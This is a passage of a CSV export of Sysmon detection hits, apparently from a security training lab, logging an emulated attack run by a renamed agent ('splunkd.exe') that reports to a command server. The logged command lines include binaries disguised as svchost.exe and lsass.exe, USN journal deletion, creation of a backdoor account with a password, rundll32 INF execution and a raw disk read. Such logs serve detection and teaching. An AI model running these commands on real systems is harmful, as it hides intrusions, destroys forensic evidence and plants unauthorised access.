13:13:20.923","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:21.162 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172693,"Cmdline: ""C:\WINDOWS\system32\calc.exe"" ¦ Proc: C:\Windows\System32\calc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4836 ¦ PGUID: E9F06A57-9571-694A-D502-000000002300 ¦ ParentPID: 8360 ¦ ParentPGUID: E9F06A57-9570-694A-D302-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:21.160","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.694 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:34.787 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172697,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 1196 ¦ PGUID: E9F06A57-95BA-694A-D802-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:14:34.785","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.716 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172698,"Cmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2876 ¦ PGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.708","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.816 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172699,"Cmdline: fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\fsutil.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-95C7-694A-DA02-000000002300 ¦ ParentPID: 2876 ¦ ParentPGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ Description: fsutil.exe ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=372D87C19688207295102C51F101ECA0,SHA256=B45547A228FAFFB4CE8CB6F362CFCBCCB441359EB87CF43FDFC8A21B3653E081,IMPHASH=BE5507FF6FB7CBBEA73D7F35F4857805","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.758","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:23.674 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172700,"Cmdline: C:\WINDOWS\system32\svchost.exe -k wsappx -p ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 7836 ¦ PGUID: E9F06A57-95EB-694A-DB02-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:15:23.666","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.913 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172701,"Cmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2620 ¦ PGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.899","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.952 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172702,"Cmdline: net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1652 ¦ PGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ ParentPID: 2620 ¦ ParentPGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0E6C2EDA203E61C8AB3B5FAF6E3F49A7,SHA256=63A96F43EB673FD465A4238E3A2BBFE5273B858D806A58375BA1520CE097CDF4,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.950","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.985 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172703,"Cmdline: C:\WINDOWS\system32\net1 user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3268 ¦ PGUID: E9F06A57-95FC-694A-DE02-000000002300 ¦ ParentPID: 1652 ¦ ParentPGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net1.exe ¦ ParentImage: C:\Windows\System32\net.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.982","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.945 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172704,"Cmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.934","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.959 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172707,"Cmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4124 ¦ PGUID: E9F06A57-964E-694A-E102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.957","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.971 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172708,"Cmdline: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\rundll32.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8964 ¦ PGUID: E9F06A57-964E-694A-E202-000000002300 ¦ ParentPID: 4124 ¦ ParentPGUID: E9F06A57-964E-694A-E102-000000002300 ¦ Description: Windows host process (Rundll32) ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CBA4E8BBCFA49E5C546C138CF6E914F3,SHA256=9BACA6F9FD3F9330A880F13D449408395278C1923813EC8999C3ECD017111B5D,IMPHASH=3DB48F7E208E17408E177BD8B816560A","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: RUNDLL32.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.970","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.006 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172709,"Cmdline: cmd.exe /C copy %%SystemRoot%%\System32\cmd.exe %%SystemRoot%%\Temp\lsass.exe && %%SystemRoot%%\Temp\lsass.exe /B ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:24.991","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: 